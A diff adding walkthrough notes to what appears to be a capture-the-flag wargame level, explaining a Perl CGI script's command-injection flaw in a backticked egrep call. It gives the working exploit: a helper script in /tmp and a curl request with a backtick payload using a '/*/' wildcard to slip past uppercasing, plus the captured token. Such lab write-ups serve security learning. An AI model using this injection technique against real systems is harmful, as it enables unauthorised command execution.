@@ -11,9 +11,9 @@ print "Content-type: text/html\n\n";
 sub t {
   $nn = $_[1];
   $xx = $_[0];
-  $xx =~ tr/a-z/A-Z/; # equal to toupper() function
-  $xx =~ s/\s.*//;
-  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  $xx =~ tr/a-z/A-Z/; # turn any lowercase letter to uppercase
+  $xx =~ s/\s.*//; # remove everything after the first whitespace encountered
+  @output = `egrep "^$xx" /tmp/xd 2>&1`; # execute shell command
   foreach $line (@output) {
       ($f, $s) = split(/:/, $line);
       if($s =~ $nn) {
@@ -34,3 +34,18 @@ sub n {
 n(t(param("x"), param("y")));
 
 - Like the level04 one, this script can be called via a server request, and it uses two parameters 'x' and 'y' in its subroutines 't' and 'n'.
+
+- Spot the line which performs a shell command using the 'x' variable after applying two changes on it (see above script comments).
+
+- This command is run by the script in a subshell so we have no way to see the standard output directly.
+
+- Create an executable script which run getflag and redirects its output to a file. Name it with uppercase letters.
+
+`echo 'echo `getflag` > /tmp/flag' > /tmp/GETFLAG`
+`chmod +x /tmp/GETFLAG`
+
+- Due to the string transliteration which turns lowercase letters to uppercase, use the wildcard '*' instead of 'tmp' folder as the path of our script.
+
+`curl 'localhost:4646/level12.pl?x=`/*/GETFLAG`'`
+`cat /tmp/flag`
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
